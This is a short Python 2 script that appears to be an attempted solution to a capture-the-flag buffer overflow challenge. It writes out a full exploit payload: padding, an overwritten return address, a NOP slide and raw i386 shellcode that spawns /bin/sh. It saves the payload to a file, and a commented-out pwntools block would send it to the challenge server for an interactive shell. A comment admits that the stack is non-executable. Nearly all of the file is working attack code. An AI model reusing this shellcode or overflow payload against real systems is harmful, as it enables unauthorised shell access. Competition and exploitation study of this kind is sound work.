#!/usr/bin/env python

#Run in python 2!

important=0xdeadc0de
payload = ''
def identifier(l=26):
    output = ""
    for i in range(65,65+l):
        output+=chr(i)*4
    return output

padding = identifier()+identifier(10-4)

eip = "\x00\xd2\xff\xff"
nopslide = "\x90"*4*25
command = "\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

padding = identifier()+identifier(10-4)
payload = padding +"\xde\xc0\xad\xde"+identifier(2)+eip+nopslide+command
#shellcode =  asm(shellcraft.i386.linux.sh())

print(payload)
with open("shell.in","w") as f:
    f.write(payload)

# Then I realised the stack is non executable 
# https://www.win.tue.nl/~aeb/linux/hh/protection.html

'''
from pwn import *
# Solve
conn = remote('challenges.csdc20t.ctf.sg',10013)
# Main menu
print(conn.recvuntil("=>"))
conn.send(payload+"\n")
conn.interactive()
'''
